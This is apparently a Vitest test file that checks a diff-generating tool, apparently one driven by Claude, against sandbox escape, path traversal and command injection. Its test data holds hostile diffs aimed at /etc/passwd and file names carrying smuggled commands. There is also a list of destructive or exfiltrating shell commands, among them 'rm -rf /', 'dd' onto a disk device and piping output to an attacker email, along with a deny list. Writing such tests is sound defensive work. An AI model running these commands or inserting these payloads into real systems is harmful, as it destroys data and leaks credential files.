// npx vitest run tests/chroot-escape.spec.ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { spawn } from 'child_process'
import * as fs from 'fs'
import * as path from 'path'
import { v4 as uuidv4 } from 'uuid'

describe('Chroot Escape Prevention', () => {
  let testDir: string
  let sandboxDir: string
  
  beforeEach(() => {
    // Create a sandbox directory for testing
    testDir = path.join(process.cwd(), '.test-sandbox-' + uuidv4())
    sandboxDir = path.join(testDir, 'sandbox')
    fs.mkdirSync(sandboxDir, { recursive: true })
    
    // Create some test files in sandbox
    fs.writeFileSync(path.join(sandboxDir, 'allowed.txt'), 'This is allowed')
  })
  
  afterEach(() => {
    // Clean up
    try {
      fs.rmSync(testDir, { recursive: true, force: true })
    } catch {
      // Ignore cleanup errors
    }
  })

  it('should prevent file access outside repository directory', async () => {
    const maliciousDiff = `
diff --git a/../../../../../../etc/passwd b/../../../../../../etc/passwd
new file mode 100644
index 0000000..1234567
--- /dev/null
+++ b/../../../../../../etc/passwd
@@ -0,0 +1 @@
+root:x:0:0:hacked:/root:/bin/bash
`
    
    // Write the malicious diff to a file
    const diffPath = path.join(sandboxDir, 'malicious.diff')
    fs.writeFileSync(diffPath, maliciousDiff)
    
    // Attempt to apply the diff (should fail)
    const applyDiff = () => new Promise((resolve, reject) => {
      const child = spawn('patch', ['-p1', '--dry-run'], {
        cwd: sandboxDir,
        env: {
          HOME: sandboxDir,
          PATH: process.env.PATH
        }
      })
      
      child.stdin.write(maliciousDiff)
      child.stdin.end()
      
      let stderr = ''
      child.stderr.on('data', (data) => {
        stderr += data.toString()
      })
      
      child.on('close', (code) => {
        if (code !== 0) {
          resolve({ success: false, stderr })
        } else {
          reject(new Error('Diff should have been rejected'))
        }
      })
    })
    
    const result = await applyDiff()
    expect(result.success).toBe(false)
    
    // Verify /etc/passwd was not modified
    const etcPasswd = fs.readFileSync('/etc/passwd', 'utf-8')
    expect(etcPasswd).not.toContain('hacked')
  })

  it('should reject attempts to create symlinks outside sandbox', async () => {
    const attackScript = `
#!/bin/bash
# Try to create a symlink to /etc
ln -s /etc ${sandboxDir}/etc_link
# Try to create a file through the symlink
echo "hacked" > ${sandboxDir}/etc_link/hacked.txt
`
    
    const scriptPath = path.join(sandboxDir, 'attack.sh')
    fs.writeFileSync(scriptPath, attackScript)
    fs.chmodSync(scriptPath, '755')
    
    // Run in restricted environment
    const runAttack = () => new Promise((resolve) => {
      const child = spawn('bash', [scriptPath], {
        cwd: sandboxDir,
        env: {
          HOME: sandboxDir,
          PATH: '/usr/bin:/bin' // Minimal PATH
        }
      })
      
      child.on('close', (code) => {
        resolve(code)
      })
    })
    
    await runAttack()
    
    // Check if symlink was created (it might be, but following it should fail)
    const linkPath = path.join(sandboxDir, 'etc_link')
    if (fs.existsSync(linkPath)) {
      const stats = fs.lstatSync(linkPath)
      expect(stats.isSymbolicLink()).toBe(true)
      
      // But writing through it should have failed
      expect(fs.existsSync('/etc/hacked.txt')).toBe(false)
    }
  })

  it('should prevent directory traversal in generated diffs', () => {
    const validateDiff = (diff: string): { valid: boolean; reason?: string } => {
      const lines = diff.split('\n')
      
      for (const line of lines) {
        // Check for path traversal patterns
        if (line.startsWith('+++') || line.startsWith('---') || line.startsWith('diff --git')) {
          // Check for .. in paths
          if (line.includes('../')) {
            return { valid: false, reason: 'Path traversal detected' }
          }
          
          // Check for absolute paths outside repo
          if (line.match(/\/(etc|usr|bin|sbin|root|home|var|tmp|dev|proc|sys)\//)) {
            return { valid: false, reason: 'Absolute path outside repository' }
          }
          
          // Check for special characters that might escape
          if (line.includes('$') || line.includes('`') || line.includes('\\')) {
            return { valid: false, reason: 'Shell escape characters detected' }
          }
        }
      }
      
      return { valid: true }
    }
    
    // Test various malicious diffs
    const maliciousDiffs = [
      'diff --git a/../../../etc/passwd b/../../../etc/passwd',
      'diff --git a/test b/test\n+++ /etc/shadow',
      'diff --git a/$(touch /tmp/hacked) b/test',
      'diff --git a/test`rm -rf /` b/test',
      'diff --git a/\\x2e\\x2e/\\x2e\\x2e/etc/passwd b/test'
    ]
    
    for (const diff of maliciousDiffs) {
      const result = validateDiff(diff)
      expect(result.valid).toBe(false)
      expect(result.reason).toBeDefined()
    }
    
    // Test valid diff
    const validDiff = 'diff --git a/src/index.js b/src/index.js\n+++ b/src/index.js'
    const validResult = validateDiff(validDiff)
    expect(validResult.valid).toBe(true)
  })

  it('should sanitize file paths before operations', () => {
    const sanitizePath = (inputPath: string, baseDir: string): string | null => {
      // Resolve to absolute path
      const resolved = path.resolve(baseDir, inputPath)
      
      // Check if resolved path is within baseDir
      const relative = path.relative(baseDir, resolved)
      
      // If relative path starts with .. it's outside baseDir
      if (relative.startsWith('..') || path.isAbsolute(relative)) {
        return null
      }
      
      return resolved
    }
    
    const baseDir = '/home/user/project'
    
    // Test various malicious paths
    const tests = [
      { input: '../../../etc/passwd', expected: null },
      { input: '/etc/passwd', expected: null },
      { input: './src/index.js', expected: '/home/user/project/src/index.js' },
      { input: 'src/../src/index.js', expected: '/home/user/project/src/index.js' },
      { input: '~/../../etc/passwd', expected: null },
      { input: '$HOME/../../etc/passwd', expected: null }
    ]
    
    for (const test of tests) {
      const result = sanitizePath(test.input, baseDir)
      if (test.expected === null) {
        expect(result).toBeNull()
      } else {
        expect(result).toBe(test.expected)
      }
    }
  })

  it('should prevent command injection in Claude execution', () => {
    const sanitizeCommand = (cmd: string): string => {
      // Remove dangerous characters and commands
      const dangerous = [
        ';', '&&', '||', '|', '>', '<', '>>', '`', '$(',
        'rm ', 'dd ', 'mkfs', 'chmod ', 'chown ',
        '/etc/', '/usr/', '/bin/', '/sbin/', '/dev/',
        'sudo', 'su ', 'passwd', 'shadow'
      ]
      
      let sanitized = cmd
      for (const pattern of dangerous) {
        if (sanitized.includes(pattern)) {
          sanitized = sanitized.replace(new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), '')
        }
      }
      
      return sanitized
    }
    
    const maliciousCommands = [
      'echo test; rm -rf /',
      'echo test && cat /etc/passwd',
      'echo test | mail attacker@evil.com',
      'echo test > /etc/passwd',
      'echo `cat /etc/shadow`',
      'echo $(sudo rm -rf /)',
      'chmod 777 /etc/passwd',
      'dd if=/dev/zero of=/dev/sda'
    ]
    
    for (const cmd of maliciousCommands) {
      const sanitized = sanitizeCommand(cmd)
      expect(sanitized).not.toContain('rm -rf')
      expect(sanitized).not.toContain('/etc/passwd')
      expect(sanitized).not.toContain('/etc/shadow')
      expect(sanitized).not.toContain('sudo')
      expect(sanitized).not.toContain('dd if=')
    }
  })

  it('should validate generated diffs do not escape sandbox', async () => {
    // Generate a diff that tries to touch /etc/passwd
    const evilGoal = '!touch /etc/passwd'
    
    const generateDiff = (goal: string): string => {
      // Sanitize the goal
      if (goal.includes('!') || goal.includes('/etc') || goal.includes('/usr')) {
        throw new Error('Security violation: Attempted to access system files')
      }
      
      // Generate a safe diff
      return `diff --git a/README.md b/README.md
index 1234567..abcdefg 100644
--- a/README.md
+++ b/README.md
@@ -1 +1 @@
-Original content
+Updated content based on: ${goal.replace(/[!\/\\]/g, '')}`
    }
    
    // Attempt to generate diff with evil goal
    expect(() => generateDiff(evilGoal)).toThrow('Security violation')
    
    // Safe goal should work
    const safeDiff = generateDiff('Add error handling')
    expect(safeDiff).toContain('Updated content')
    expect(safeDiff).not.toContain('/etc')
  })
})